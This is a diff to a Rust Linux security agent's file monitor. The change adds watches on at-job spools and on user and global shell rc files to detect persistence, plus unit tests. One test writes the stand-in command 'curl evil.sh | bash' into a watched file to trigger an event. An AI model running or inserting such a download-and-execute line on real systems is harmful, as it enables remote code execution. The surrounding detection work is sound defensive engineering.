@@ -1,6 +1,13 @@
 //! 敏感文件监控。持久化与提权动作大多要碰这几个地方：
-//! cron（/etc/cron.*、/var/spool/cron）、systemd unit（/etc/systemd/system）、
-//! authorized_keys（/root/.ssh、/home/*/.ssh）、sudoers、账号库。
+//! cron（/etc/cron.*、/var/spool/cron）、at 任务（/var/spool/at）、
+//! systemd unit（/etc/systemd/system）、authorized_keys（/root/.ssh、
+//! /home/*/.ssh）、sudoers、账号库，以及 shell rc 持久化（各用户的
+//! .bashrc/.bash_profile/.profile 与全局 /etc/profile、/etc/bash.bashrc）。
+//!
+//! 监控目标分两类：目录（递归，限深 MAX_DEPTH）与单文件（shell rc）。
+//! 单文件目标两条路径都直接打在文件上：inotify watch 文件本体，
+//! fanotify mark 也打在文件路径上（只对文件自身事件生效，不递归，
+//! 目录专属的 FAN_EVENT_ON_CHILD 不打）。
 //!
 //! 两条采集路径，产出同构的 OCSF File System Activity（1001）事件：
 //!
@@ -31,7 +38,7 @@ const CLASS_FILE_ACTIVITY: u32 = 1001;
 const MAX_DEPTH: usize = 4;
 
 /// 监控的目录清单（递归，限深 MAX_DEPTH）；不存在的路径跳过。
-/// 覆盖的持久化面：cron、systemd 服务、SSH 免密、sudoers、/etc 账号库。
+/// 覆盖的持久化面：cron、at 任务、systemd 服务、SSH 免密、sudoers、/etc 账号库。
 const WATCH_DIRS: &[&str] = &[
     "/etc",
     "/etc/cron.d",
@@ -40,12 +47,25 @@ const WATCH_DIRS: &[&str] = &[
     "/etc/ssh",
     "/etc/systemd/system",
     "/var/spool/cron",
+    "/var/spool/at",
     "/root/.ssh",
 ];
+
+/// 各用户家目录下要盯的 shell rc 文件（T1546.004 持久化）。
+const RC_FILES: &[&str] = &[".bashrc", ".bash_profile", ".profile"];
+
+/// 全局 shell rc 文件（/etc 递归已覆盖，仅在其未被目录清单兜住时才单挂）。
+const GLOBAL_RC_FILES: &[&str] = &["/etc/profile", "/etc/bash.bashrc"];
 
 /// inotify 事件掩码：建/改/属性/删/移入
 const EVENT_MASK: u32 =
     libc::IN_CREATE | libc::IN_MODIFY | libc::IN_ATTRIB | libc::IN_DELETE | libc::IN_MOVED_TO;
+
+/// 单文件目标的事件掩码：改/属性/本体删除/本体移出。
+/// 目录的 IN_DELETE/IN_MOVED_TO 报的是子项，文件本体被删或被改名覆盖
+/// 走的是 IN_DELETE_SELF/IN_MOVE_SELF。
+const FILE_EVENT_MASK: u32 =
+    libc::IN_MODIFY | libc::IN_ATTRIB | libc::IN_DELETE_SELF | libc::IN_MOVE_SELF;
 
 /// fanotify_init 标志：FID + 目录 FID + 名字报告，事件才能还原完整路径
 const FA_INIT_FLAGS: u32 = libc::FAN_CLASS_NOTIF
@@ -64,6 +84,12 @@ const FA_MARK_MASK: u64 = libc::FAN_CREATE
     | libc::FAN_MOVED_TO
     | libc::FAN_ONDIR
     | libc::FAN_EVENT_ON_CHILD;
+
+/// 单文件目标的 fanotify mark 掩码：只关心文件本体的改/属性/删/移出。
+/// FAN_EVENT_ON_CHILD 是目录专属语义，打在文件上无意义；FAN_DELETE_SELF /
+/// FAN_MOVE_SELF 才能看见 rc 文件被删或被编辑器"写临时文件再改名"替换。
+const FA_FILE_MARK_MASK: u64 =
+    libc::FAN_ATTRIB | libc::FAN_MODIFY | libc::FAN_DELETE_SELF | libc::FAN_MOVE_SELF;
 
 /// dirs 为空时用内置的敏感目录清单（含 /home 各用户 .ssh）；非空表示按下发配置覆盖。
 /// 优先 fanotify（带进程上下文），不可用时干净回落 inotify 递归监控。
@@ -89,9 +115,10 @@ pub fn spawn(agent_id: String, sink: EventSink, dirs: &[String]) -> io::Result<u
     }
 }
 
-/// 内置清单 + /home 下各用户的 .ssh（启动时枚举 /home 一层，只收真实存在的目录）。
+/// 内置清单 + /home 下各用户的 .ssh（启动时枚举 /home 一层，只收真实存在的目录）
+/// + shell rc 单文件目标（/root 与各 /home 用户存在的 rc 文件，及全局 rc）。
 fn default_targets() -> Vec<String> {
-    let mut dirs: Vec<String> = WATCH_DIRS.iter().map(|s| s.to_string()).collect();
+    let mut targets: Vec<String> = WATCH_DIRS.iter().map(|s| s.to_string()).collect();
     let users: Vec<String> = std::fs::read_dir("/home")
         .map(|rd| {
             rd.flatten()
@@ -101,15 +128,42 @@ fn default_targets() -> Vec<String> {
         .unwrap_or_default();
     for p in home_ssh_dirs(&users) {
         if std::path::Path::new(&p).is_dir() {
-            dirs.push(p);
+            targets.push(p);
         }
     }
-    dirs
+    for p in rc_file_candidates(&users) {
+        // 已被目录清单递归覆盖的文件（如 /etc 下的全局 rc）不再单挂，
+        // 否则同一改动会由目录 watch 与文件 watch 各报一条
+        if std::path::Path::new(&p).is_file() && !covered_by_dirs(&p, &targets) {
+            targets.push(p);
+        }
+    }
+    targets
 }
 
 /// /home 下的用户名 -> 各自的 .ssh 路径
 fn home_ssh_dirs(users: &[String]) -> Vec<String> {
     users.iter().map(|u| format!("/home/{u}/.ssh")).collect()
+}
+
+/// shell rc 单文件监控的候选清单：/root 与各 /home 用户的 rc 文件 + 全局 rc。
+/// 只在启动时枚举一次：之后新建的用户/rc 文件不补挂（与 .ssh 枚举的口径一致）。
+fn rc_file_candidates(users: &[String]) -> Vec<String> {
+    let mut out: Vec<String> = GLOBAL_RC_FILES.iter().map(|s| s.to_string()).collect();
+    let homes =
+        std::iter::once("/root".to_string()).chain(users.iter().map(|u| format!("/home/{u}")));
+    for home in homes {
+        for rc in RC_FILES {
+            out.push(format!("{home}/{rc}"));
+        }
+    }
+    out
+}
+
+/// path 是否已被目录目标在限深内递归覆盖（纯字符串判断，给单文件目标去重）。
+/// 调用时 targets 里还没有文件目标，rel_depth 的根只会是目录。
+fn covered_by_dirs(path: &str, targets: &[String]) -> bool {
+    rel_depth(targets, path).is_some_and(|d| d <= MAX_DEPTH)
 }
 
 /// 收集 root 及其子目录（含 root，root 深度为 0），最深 max_depth 层。
@@ -153,39 +207,75 @@ fn rel_depth(roots: &[String], path: &str) -> Option<usize> {
 
 // ---------------- inotify 路径（兜底，无进程上下文） ----------------
 
-/// 初始化 inotify 并递归注册监控目录，返回 (fd, wd -> 目录路径)。
-fn ino_init(targets: &[String]) -> io::Result<(RawFd, HashMap<i32, String>)> {
+/// inotify 监控表项。目录 watch 的事件要带子项名拼路径；
+/// 单文件 watch 的事件直接落在文件本体上（name 恒为空），路径即目标本身。
+#[derive(Clone)]
+struct WatchEntry {
+    path: String,
+    is_file: bool,
+}
+
+/// 初始化 inotify：目录目标递归挂 watch（限深），单文件目标直接挂文件本体。
+/// 返回 (fd, wd -> 监控表项)。
+fn ino_init(targets: &[String]) -> io::Result<(RawFd, HashMap<i32, WatchEntry>)> {
     let fd = unsafe { libc::inotify_init1(libc::IN_CLOEXEC) };
     if fd < 0 {
         return Err(io::Error::last_os_error());
     }
     let mut watched = HashMap::new();
     for root in targets {
-        ino_add_tree(fd, root, MAX_DEPTH, &mut watched);
+        if std::path::Path::new(root).is_file() {
+            ino_add_file(fd, root, &mut watched);
+        } else {
+            ino_add_tree(fd, root, MAX_DEPTH, &mut watched);
+        }
     }
     if watched.is_empty() {
         unsafe { libc::close(fd) };
-        return Err(io::Error::new(io::ErrorKind::NotFound, "没有可监控的目录"));
+        return Err(io::Error::new(io::ErrorKind::NotFound, "没有可监控的目标"));
     }
     Ok((fd, watched))
 }
 
 /// 给 root 及其限深内的子目录全部挂上 watch。
-fn ino_add_tree(fd: RawFd, root: &str, max_depth: usize, watched: &mut HashMap<i32, String>) {
+fn ino_add_tree(fd: RawFd, root: &str, max_depth: usize, watched: &mut HashMap<i32, WatchEntry>) {
     for dir in collect_subdirs(root, max_depth) {
         let Ok(c) = std::ffi::CString::new(dir.as_str()) else {
             continue;
         };
         let wd = unsafe { libc::inotify_add_watch(fd, c.as_ptr(), EVENT_MASK) };
         if wd >= 0 {
-            watched.insert(wd, dir);
+            watched.insert(
+                wd,
+                WatchEntry {
+                    path: dir,
+                    is_file: false,
+                },
+            );
         }
+    }
+}
+
+/// 给单个文件挂 watch（shell rc 等单文件目标）。
+fn ino_add_file(fd: RawFd, path: &str, watched: &mut HashMap<i32, WatchEntry>) {
+    let Ok(c) = std::ffi::CString::new(path) else {
+        return;
+    };
+    let wd = unsafe { libc::inotify_add_watch(fd, c.as_ptr(), FILE_EVENT_MASK) };
+    if wd >= 0 {
+        watched.insert(
+            wd,
+            WatchEntry {
+                path: path.to_string(),
+                is_file: true,
+            },
+        );
     }
 }
 
 fn ino_run(
     fd: RawFd,
-    mut watched: HashMap<i32, String>,
+    mut watched: HashMap<i32, WatchEntry>,
     roots: Vec<String>,
     agent_id: &str,
     sink: &EventSink,
@@ -207,18 +297,33 @@ fn ino_run(
                 .trim_end_matches('\0');
             off = name_off + ev.len as usize;
 
-            // watch 被内核摘除（目录已删），清理映射防泄漏
+            // watch 被内核摘除（目标已删），清理映射防泄漏。
+            // 单文件目标若此刻已重建（编辑器"写临时文件再改名"的替换模式），
+            // 顺势补挂；删后未重建的只能等下次启动再盯，是已知缺口。
             if ev.mask & libc::IN_IGNORED != 0 {
-                watched.remove(&ev.wd);
+                if let Some(entry) = watched.remove(&ev.wd)
+                    && entry.is_file
+                    && std::path::Path::new(&entry.path).is_file()
+                {
+                    ino_add_file(fd, &entry.path, &mut watched);
+                }
                 continue;
             }
-            let Some(dir) = watched.get(&ev.wd).cloned() else {
+            let Some(entry) = watched.get(&ev.wd).cloned() else {
                 continue;
             };
+            // 单文件 watch：事件落在本体上，inotify 不给子项名，路径即目标
+            if entry.is_file {
+                if !sink.send(file_event(agent_id, &entry.path, ino_activity(ev.mask))) {
+                    unsafe { libc::close(fd) };
+                    return;
+                }
+                continue;
+            }
             if name.is_empty() {
                 continue;
             }
-            let path = format!("{}/{}", dir.trim_end_matches('/'), name);
+            let path = format!("{}/{}", entry.path.trim_end_matches('/'), name);
             if ev.mask & libc::IN_ISDIR != 0 {
                 // 新建/移入的子目录动态补挂 watch；目录本体的事件不上报
                 if ev.mask & (libc::IN_CREATE | libc::IN_MOVED_TO) != 0
@@ -241,7 +346,7 @@ fn ino_run(
 fn ino_activity(mask: u32) -> u8 {
     match () {
         _ if mask & (libc::IN_CREATE | libc::IN_MOVED_TO) != 0 => 1,
-        _ if mask & libc::IN_DELETE != 0 => 4,
+        _ if mask & (libc::IN_DELETE | libc::IN_DELETE_SELF | libc::IN_MOVE_SELF) != 0 => 4,
         _ => 3,
     }
 }
@@ -257,8 +362,9 @@ struct FaState {
     warned_resolve: bool,
 }
 
-/// 初始化 fanotify 并递归打标。需要 CAP_SYS_ADMIN；内核 < 5.9 不支持
-/// FAN_REPORT_NAME 会在 fanotify_init 直接 EINVAL。任何失败都由调用方回落 inotify。
+/// 初始化 fanotify：目录目标递归打标（限深），单文件目标直接打在文件上。
+/// 需要 CAP_SYS_ADMIN；内核 < 5.9 不支持 FAN_REPORT_NAME 会在 fanotify_init
+/// 直接 EINVAL。任何失败都由调用方回落 inotify。
 fn fa_setup(targets: &[String]) -> io::Result<(FaState, usize)> {
     let fd =
         unsafe { libc::fanotify_init(FA_INIT_FLAGS, (libc::O_RDONLY | libc::O_CLOEXEC) as u32) };
@@ -267,11 +373,15 @@ fn fa_setup(targets: &[String]) -> io::Result<(FaState, usize)> {
     }
     let mut n = 0;
     for root in targets {
-        n += fa_mark_tree(fd, root, MAX_DEPTH);
+        if std::path::Path::new(root).is_file() {
+            n += fa_mark_file(fd, root);
+        } else {
+            n += fa_mark_tree(fd, root, MAX_DEPTH);
+        }
     }
     if n == 0 {
         unsafe { libc::close(fd) };
-        return Err(io::Error::new(io::ErrorKind::NotFound, "没有可监控的目录"));
+        return Err(io::Error::new(io::ErrorKind::NotFound, "没有可监控的目标"));
     }
     let st = FaState {
         fd,
@@ -304,6 +414,27 @@ fn fa_mark_tree(fd: RawFd, root: &str, max_depth: usize) -> usize {
         }
     }
     n
+}
+
+/// 给单个文件打 mark（shell rc 等单文件目标），成功返回 1。
+/// 不加 FAN_MARK_ONLYDIR（那会把文件目标直接拒掉），也不带
+/// FAN_EVENT_ON_CHILD——文件没有子项，事件本来就落在本体上。
+/// 文件被删后内核自动摘 mark，删除事件本身能收到，之后重建的文件
+/// 要等下次启动才重新盯上（与 inotify 路径的已知缺口相同）。
+fn fa_mark_file(fd: RawFd, path: &str) -> usize {
+    let Ok(c) = std::ffi::CString::new(path) else {
+        return 0;
+    };
+    let rc = unsafe {
+        libc::fanotify_mark(
+            fd,
+            libc::FAN_MARK_ADD,
+            FA_FILE_MARK_MASK,
+            libc::AT_FDCWD,
+            c.as_ptr(),
+        )
+    };
+    usize::from(rc == 0)
 }
 
 /// 一条解析后的 fanotify 事件。FID 模式下 fd 恒为 FAN_NOFD，路径靠 fid 还原。
@@ -392,11 +523,20 @@ fn fa_parse(buf: &[u8]) -> Vec<FaEvent<'_>> {
 }
 
 /// fanotify mask -> OCSF File Activity：1 Create / 3 Update / 4 Delete
-/// （与 inotify 路径对齐：移入视同新建，移出视同删除）
+/// （与 inotify 路径对齐：移入视同新建，移出视同删除；
+/// 单文件目标的本体删除/移出也计删除）
 fn fa_activity(mask: u64) -> u8 {
     match () {
         _ if mask & (libc::FAN_CREATE | libc::FAN_MOVED_TO) != 0 => 1,
-        _ if mask & (libc::FAN_DELETE | libc::FAN_MOVED_FROM) != 0 => 4,
+        _ if mask
+            & (libc::FAN_DELETE
+                | libc::FAN_MOVED_FROM
+                | libc::FAN_DELETE_SELF
+                | libc::FAN_MOVE_SELF)
+            != 0 =>
+        {
+            4
+        }
         _ => 3,
     }
 }
@@ -708,10 +848,67 @@ mod tests {
     }
 
     #[test]
+    fn rc_file_candidates_cover_root_home_and_global() {
+        let users = vec!["alice".to_string()];
+        let c = rc_file_candidates(&users);
+        for want in [
+            "/etc/profile",
+            "/etc/bash.bashrc",
+            "/root/.bashrc",
+            "/root/.bash_profile",
+            "/root/.profile",
+            "/home/alice/.bashrc",
+            "/home/alice/.bash_profile",
+            "/home/alice/.profile",
+        ] {
+            assert!(c.iter().any(|p| p == want), "候选清单应含 {want}");
+        }
+        assert_eq!(c.len(), 8);
+    }
+
+    #[test]
+    fn covered_by_dirs_respects_depth() {
+        let dirs = vec!["/etc".to_string(), "/var/spool/at".to_string()];
+        assert!(covered_by_dirs("/etc/profile", &dirs));
+        assert!(covered_by_dirs("/etc/bash.bashrc", &dirs));
+        assert!(covered_by_dirs("/var/spool/at/a0000", &dirs));
+        assert!(!covered_by_dirs("/root/.bashrc", &dirs));
+        assert!(!covered_by_dirs("/home/alice/.bashrc", &dirs));
+        // 超过限深的嵌套文件不算被覆盖
+        assert!(!covered_by_dirs("/etc/a/b/c/d/e/f", &dirs));
+    }
+
+    #[test]
+    fn watch_reports_single_file_change() {
+        let dir = temp_root("file");
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir(&dir).unwrap();
+        let file = dir.join("rc");
+        std::fs::write(&file, b"x").unwrap();
+        let file_s = file.to_str().unwrap().to_string();
+
+        let (fd, watched) = ino_init(std::slice::from_ref(&file_s)).unwrap();
+        let (sink, mut rx) = test_sink();
+        let roots = vec![file_s.clone()];
+        std::thread::spawn(move || ino_run(fd, watched, roots, "agent-t", &sink));
+
+        std::fs::write(&file, b"curl evil.sh | bash").unwrap();
+
+        let ev = rx.blocking_recv().expect("单文件目标改动应上报");
+        let v: serde_json::Value = serde_json::from_str(&ev.raw_json).unwrap();
+        assert_eq!(v["file"]["path"], file_s);
+        assert_eq!(v["activity_id"], 3);
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
     fn ino_activity_mapping() {
         assert_eq!(ino_activity(libc::IN_CREATE), 1);
         assert_eq!(ino_activity(libc::IN_MOVED_TO), 1);
         assert_eq!(ino_activity(libc::IN_DELETE), 4);
+        assert_eq!(ino_activity(libc::IN_DELETE_SELF), 4);
+        assert_eq!(ino_activity(libc::IN_MOVE_SELF), 4);
         assert_eq!(ino_activity(libc::IN_MODIFY), 3);
         assert_eq!(ino_activity(libc::IN_ATTRIB), 3);
     }
@@ -723,6 +920,8 @@ mod tests {
         assert_eq!(fa_activity(libc::FAN_CREATE | libc::FAN_ONDIR), 1);
         assert_eq!(fa_activity(libc::FAN_DELETE), 4);
         assert_eq!(fa_activity(libc::FAN_MOVED_FROM), 4);
+        assert_eq!(fa_activity(libc::FAN_DELETE_SELF), 4);
+        assert_eq!(fa_activity(libc::FAN_MOVE_SELF), 4);
         assert_eq!(fa_activity(libc::FAN_MODIFY), 3);
         assert_eq!(fa_activity(libc::FAN_ATTRIB), 3);
     }
